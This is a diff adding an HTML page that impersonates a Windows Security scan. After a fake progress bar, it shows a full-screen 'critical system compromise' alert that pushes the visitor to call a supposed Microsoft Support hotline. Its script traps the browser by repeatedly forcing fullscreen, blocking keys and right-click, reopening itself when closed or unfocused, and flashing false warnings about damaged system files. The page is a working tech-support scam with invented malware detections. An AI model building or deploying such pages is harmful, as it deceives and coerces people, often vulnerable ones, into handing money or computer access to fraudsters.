@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Security Critical Alert</title>
+    <style>
+        :root {
+            --win-red: #D13438;
+            --win-blue: #0067C0;
+            --win-bg: #F3F3F3;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", system-ui;
+            background: var(--win-bg);
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .scan-container {
+            display: none;
+            text-align: center;
+            padding: 2rem;
+            max-width: 500px;
+            margin: auto;
+        }
+
+        .critical-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #0c6bf0;
+            color: #fff;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .emergency-button {
+            background: var(--win-green);
+            color: white;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .progress-bar {
+            height: 8px;
+            background: #444;
+            border-radius: 4px;
+            margin: 2rem 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--win-red);
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="scan-container" id="scanDialog">
+        <h2>🛡️ Windows Security Scan</h2>
+        <div class="progress-bar">
+            <div class="progress-fill" id="scanProgress" style="width: 0%"></div>
+        </div>
+        <p id="scanStatus">Initializing system scan...</p>
+    </div>
+
+    <div class="critical-screen" id="criticalScreen">
+        <h1>⚠️ CRITICAL SYSTEM COMPROMISE DETECTED</h1>
+		<h2> Dial Microsoft Support for Instant Recovery 📞 +1 (800) 786 - (0414) USA / CANADA LIVE HOTLINE LEVEL 2 GEEKS! 
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        <ul style="text-align: left; max-width: 600px; margin: 2rem auto;">
+            <li>SEVERE: Trojan:Win32/Wacatac.B!ml (Active)</li>
+            <li>EMERGENCY: System File Corruption Detected</li>
+            <li>CRITICAL: Banking Malware Signature Match</li>
+        </ul>
+        <button class="emergency-button" onclick="window.location.href='tel:+18001234567'">
+            🔒 IMMEDIATE TECHNICAL SUPPORT REQUIRED
+        </button>
+    </div>
+
+    <script>
+        let isCritical = false;
+        
+        // Start scan process automatically
+        startScanProcess();
+
+        function startScanProcess() {
+            document.getElementById('scanDialog').style.display = 'block';
+            simulateScanProgress();
+        }
+
+        function simulateScanProgress() {
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress = Math.min(progress + Math.random() * 10 + 5, 100);
+                document.getElementById('scanProgress').style.width = `${progress}%`;
+                document.getElementById('scanStatus').textContent = 
+                    `${progress.toFixed(1)}% Complete - ${getScanStatus()}`;
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    activateCriticalLock();
+                }
+            }, 500);
+        }
+
+        function getScanStatus() {
+            const statuses = [
+                'Memory Sector Analysis',
+                'Boot Record Verification',
+                'Malware Pattern Detection',
+                'Registry Integrity Check',
+                'System File Validation'
+            ];
+            return statuses[Math.floor(Math.random() * statuses.length)];
+        }
+
+        function activateCriticalLock() {
+            isCritical = true;
+            document.getElementById('scanDialog').style.display = 'none';
+            document.getElementById('criticalScreen').style.display = 'block';
+            
+            // Force fullscreen
+            const enterFullscreen = () => {
+                document.documentElement.requestFullscreen().catch(() => {
+                    setTimeout(enterFullscreen, 100);
+                });
+            };
+            enterFullscreen();
+
+            // Fullscreen lock mechanism
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement) {
+                    enterFullscreen();
+                    showErrorModal();
+                }
+            });
+
+            // Keyboard lock
+            document.addEventListener('keydown', (e) => {
+                e.preventDefault();
+                e.stopPropagation();
+                if (['Escape', 'F11', 'Alt', 'Control'].includes(e.key)) {
+                    showErrorModal();
+                    enterFullscreen();
+                }
+            });
+
+            // Mouse right-click prevention
+            document.addEventListener('contextmenu', e => e.preventDefault());
+
+            // Continuous fullscreen check
+            setInterval(() => {
+                if (!document.fullscreenElement) {
+                    enterFullscreen();
+                    showErrorModal();
+                }
+            }, 500);
+
+            // Window focus hijack
+            window.addEventListener('blur', () => {
+                window.open(location.href, '_blank');
+                window.focus();
+            });
+        }
+
+        function showErrorModal() {
+            const modal = document.createElement('div');
+            modal.style = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100vw;
+                height: 100vh;
+                background: rgba(0,0,0,0.9);
+                color: red;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 2rem;
+                z-index: 99999;
+            `;
+            modal.innerHTML = `
+                <div style="text-align: center">
+                    <div>⚠️ DO NOT CLOSE OR REFRESH YOUR BROWSER !! RESTARTING A MAY DAMAGE YOUR SYSTEM WIN32 FILES AND XML REGISTRY FILES WHICH WILL TRIGGER A ⚠️  SECURITY LOCK ENGAGED ⚠️</div>
+					 <div>⚠Contact Microsoft Support immediately! 📞 +1 (800) 786 - (0414)</div>
+                    <div style="font-size: 1.2rem; margin-top: 1rem">
+                        Unauthorized exit attempt detected!<br>
+                        Contact Microsoft Support immediately!
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+            setTimeout(() => modal.remove(), 2000);
+        }
+
+        // Persistence mechanisms
+        window.addEventListener('beforeunload', (e) => {
+            if (isCritical) {
+                e.preventDefault();
+                window.open(location.href, '_blank');
+            }
+        });
+
+        // Continuous re-engagement
+        setInterval(() => {
+            if (isCritical && !document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        }, 100);
+    </script>
+</body>
+</html>
